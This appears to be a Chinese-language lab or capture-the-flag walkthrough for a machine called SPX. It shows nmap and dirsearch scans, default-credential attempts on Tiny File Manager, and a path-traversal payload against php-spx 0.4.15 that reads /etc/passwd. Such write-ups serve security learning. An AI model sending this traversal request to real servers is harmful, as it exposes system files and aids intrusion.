```
sudo nmap -p- -vvv --min-rate 10000 192.168.174.108

```
sudo nmap -p22,80 -A 192.168.174.108 -oG SPX.txt

![image-20241203212949361](https://s2.loli.net/2024/12/03/SJfCPI7XMh6GEvs.png)

优先针对80端口的服务进行相应的目录及文件扫描

```
dirsearch -u http://192.168.174.108 -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html

查看网页内容，发现这个网页属于使用一个叫tiny file manager的工具，我们使用Google进行相应搜索，是否存在默认账号密码或可利用的漏洞

![image-20241203214753920](https://s2.loli.net/2024/12/03/ZfRKhM8vWAOH2Xx.png)

但使用这两个账号密码进行登录尝试均失败，我们进一步检查是否存在可以利用的漏洞，但我们没有相应的版本号

我们通过搜索发现2.4.6版本是存在一个RCE的漏洞，但是需要认证信息

我们继续查看上述phpinfo文件，发现有个和主机名一样的软件SPX

![image-20241203221544776](https://files.seeusercontent.com/2026/04/08/C8mw/image-20241203221544776.png)

我们查看到其有对应的版本0.4.15，同时我们查看SPX是什么软件（https://github.com/NoiseByNorthwest/php-spx）

同时我们查询到一个CVE漏洞，https://github.com/NoiseByNorthwest/php-spx/issues/251

```
访问链接：http://192.168.174.108//?SPX_KEY=dev&SPX_UI_URI=/

漏洞利用方式
GET /?SPX_KEY=dev&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

```
